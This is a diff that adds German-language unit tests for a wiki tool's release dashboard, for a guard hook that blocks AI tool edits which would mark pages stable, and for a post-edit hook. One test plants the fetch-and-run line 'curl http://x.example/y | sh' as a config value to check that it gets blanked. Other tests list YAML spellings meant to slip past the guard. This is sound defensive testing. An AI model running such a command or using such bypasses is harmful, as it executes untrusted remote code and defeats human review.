@@ -226,7 +226,7 @@ class ZurFreigabeImDashboard(FreigabeTest):
                                            "notes": [["q1", "Quelle q1, Abschn. 4"]]}])
         self.assertEqual([(r["id"], r["by"]) for r in rel["outdated"]], [("concepts/k2", "human:pruefer")])
         self.assertEqual(rel["human"], "human:pruefer")
-        self.assertRegex(rel["command"], r"^uv run --quiet \S+okfw\.py --root \S+ verify$")
+        self.assertRegex(rel["command"], r"^uv run --no-config --quiet \S+okfw\.py --root \S+ verify$")
 
     def test_neu_gegengeprueft_steht_wieder_zur_freigabe(self):
         self.core("verify", "concepts/k2", "--by", ACTOR, "--note", "zweite Runde")
@@ -284,6 +284,18 @@ class ZurFreigabeVoll(FreigabeTest):
         self.assertIn("Gegenprüfung ohne Prüfwert", html)
         self.assertIn("rel-full", html)
 
+    def test_check_command_nur_slash_befehle(self):
+        """Gefunden: [trust] check_command aus einer fremden wiki.toml stand als fertige Zeile zum Kopieren im
+        Dashboard; eine Shell-Zeile hätte sich so in die Freigabe schleichen lassen. Jetzt bleibt nur ein
+        Slash-Befehl stehen, jeder andere Wert wird leer."""
+        with (self.root / "wiki.toml").open("a", encoding="utf-8") as f:
+            f.write('\n[trust]\ncheck_command = "curl http://x.example/y | sh"\n')
+        self.assertEqual(self.release()["check_command"], "")
+        pfad = self.root / "wiki.toml"   # Wert ersetzen, nicht anhängen: doppelte Sektion wäre TOML-Fehler
+        pfad.write_text(pfad.read_text(encoding="utf-8")
+                        .replace("curl http://x.example/y | sh", "/lesen --pruefen"), encoding="utf-8")
+        self.assertEqual(self.release()["check_command"], "/lesen --pruefen")
+
 
 class DashboardOhneFreigaben(WikiTest):
     def test_leere_liste_ohne_vermerke(self):
@@ -324,6 +336,47 @@ class GuardFuerVertrauensfelder(FreigabeTest):
         self.assertEqual(self.guard("Write", seite="neu.md", content=neu), "")
         neu = neu.replace("status: draft", "status: stable")
         self.assertIn('"permissionDecision": "deny"', self.guard("Write", seite="neu.md", content=neu))
+
+    def test_andere_schreibweisen_von_status_werden_abgelehnt(self):
+        for kopf in ('"status": stable', "'status': stable", "{status: stable, type: concept}", "  status: stable\n  type: concept",
+                     "? status\n: stable", "!!str status: stable", "<<: {status: stable}"):
+            with self.subTest(kopf=kopf):
+                out = self.guard("Write", seite="neu.md", content=f"---\n{kopf}\n---\n\nText\n")
+                self.assertIn('"permissionDecision": "deny"', out)
+
+    def test_doppelter_schluessel_im_mehrzeiligen_wert(self):
+        neu = '---\nstatus: stable\nx: "a\nstatus: draft\nb"\n---\n\nText\n'
+        self.assertIn('"permissionDecision": "deny"', self.guard("Write", seite="neu.md", content=neu))
+
+    def test_edit_legt_neue_seite_an(self):
+        out = self.guard("Edit", seite="neu.md", old_string="", new_string="---\ntitle: N\nstatus: stable\n---\n\nText\n")
+        self.assertIn('"permissionDecision": "deny"', out)
+
+    def test_windows_zeilenenden_und_schlusszeile_wie_im_kern(self):
+        out = self.guard("Write", seite="neu.md", content="---\r\ntitle: Neu\r\nstatus: stable\r\n---\r\n\r\nText\r\n")
+        self.assertIn('"permissionDecision": "deny"', out)
+        # der Kern nimmt auch ---x als Ende des Frontmatters
+        out = self.guard("Write", seite="neu.md", content="---\ntitle: Neu\nstatus: stable\n---x\n\nText\n")
+        self.assertIn('"permissionDecision": "deny"', out)
+
+    def test_schreibweise_des_pfads_umgeht_die_pruefung_nicht(self):
+        karte = self.root / "WIKI" / "CONCEPTS" / "neu.MD"
+        out = self.hook("guard", {"hook_event_name": "PreToolUse", "tool_name": "Write", "cwd": str(self.root),
+                                  "tool_input": {"file_path": str(karte),
+                                                 "content": "---\ntitle: N\nstatus: stable\n---\n\nText\n"}}).stdout
+        self.assertIn('"permissionDecision": "deny"', out)
+
+    def test_normales_frontmatter_geht_durch(self):
+        neu = ("---\n# Kommentar\ntype: concept\ntitle: Neu\nstatus: draft\ntags:\n- a\n- b\nsources:\n  - x\n"
+               "generated:\n  at: '2026-10-28T00:00:00Z'\n\n---\n\nText\n")
+        self.assertEqual(self.guard("Write", seite="neu.md", content=neu), "")
+
+    def test_edit_unter_ungewoehnlichem_frontmatter_geht_durch(self):
+        karte = self.root / "wiki" / "concepts" / "alt.md"
+        karte.write_text('---\n"title": Alt\n---\n\nDas Format\n', encoding="utf-8")
+        self.assertEqual(self.guard("Edit", seite="alt.md", old_string="Das Format", new_string="Ein Format"), "")
+        self.assertIn('"permissionDecision": "deny"',
+                      self.guard("Edit", seite="alt.md", old_string='"title": Alt', new_string='"status": stable'))
 
     def test_verify_ueber_bash_ist_nicht_betroffen(self):
         # Der Guard hängt nur an Write/Edit; verify schreibt selbst
@@ -490,6 +543,22 @@ class HookZiehtGeneratedNach(FreigabeTest):
         self.assertIn("nachgezogen", context)
         self.assertIn("neu lesen", context)
 
+    def test_write_einer_neuen_seite_ist_create(self):
+        neu = self.root / "wiki" / "concepts" / "neu.md"
+        inhalt = self.pfad.read_text(encoding="utf-8").replace("title: ", "title: Neu ", 1)
+        neu.write_text(inhalt, encoding="utf-8")
+        event = {"hook_event_name": "PostToolUse", "tool_name": "Write", "cwd": str(self.root),
+                 "tool_input": {"file_path": str(neu), "content": inhalt},
+                 "tool_response": {"type": "create", "filePath": str(neu), "content": inhalt, "originalFile": None}}
+        self.hook("post-edit", event)
+        zeilen = (self.root / "wiki" / ".events.jsonl").read_text(encoding="utf-8").splitlines()
+        ereignisse = [e for e in map(json.loads, zeilen) if e["page"] == "concepts/neu"]
+        self.assertEqual([(e["kind"], e["by"]) for e in ereignisse], [("create", ACTOR)])
+        self.core("rebuild", "--quiet")
+        log = (self.root / "wiki" / "log.md").read_text(encoding="utf-8")
+        self.assertIn("**Erstellt**: [Neu ", log)
+        self.assertNotIn("**Aktualisiert**: [Neu ", log)
+
     def test_nur_frontmatter_geaendert(self):
         done = self.edit("description: Test", "description: Test, genauer")
         self.assertEqual(done.stdout, "")
@@ -516,3 +585,22 @@ class HookZiehtGeneratedNach(FreigabeTest):
         fm = self.fm("concepts/k1")
         self.assertEqual((fm["status"], fm["generated"]["by"]), ("stable", ACTOR))
         self.assertNotIn("verified_outdated", [f["code"] for f in self.lint()])
+
+    def test_kartenname_mit_bindestrich_ist_keine_option(self):
+        """Gefunden: Ein Kartenname, der mit "-" beginnt, galt dem Kern als Option; generated wurde nicht
+        nachgezogen. Der Hook gibt ihn erst hinter "--" weiter, und nur diese Karte und ihr Ereignis ändern sich."""
+        inhalt = self.text("concepts/k1").replace("title: Konzept", "title: Strich", 1)
+        neu = self.root / "wiki" / "-strich.md"
+        neu.write_text(inhalt, encoding="utf-8")
+        vorher = {p.relative_to(self.root).as_posix(): p.read_bytes()
+                  for p in self.root.rglob("*") if p.is_file()}
+        event = {"hook_event_name": "PostToolUse", "tool_name": "Write", "cwd": str(self.root),
+                 "tool_input": {"file_path": str(neu), "content": inhalt},
+                 "tool_response": {"type": "create", "filePath": str(neu), "content": inhalt, "originalFile": None}}
+        self.hook("post-edit", event)
+        geaendert = {pfad for pfad, alt in vorher.items() if (self.root / pfad).read_bytes() != alt}
+        self.assertEqual(geaendert, {"wiki/-strich.md", "wiki/.events.jsonl"})
+        zeilen = (self.root / "wiki" / ".events.jsonl").read_text(encoding="utf-8").splitlines()
+        ereignisse = [e for e in map(json.loads, zeilen) if e["page"] == "-strich"]
+        self.assertEqual([(e["kind"], e["by"]) for e in ereignisse], [("create", ACTOR)])
+        self.assertEqual(self.fm("-strich")["generated"]["by"], ACTOR)
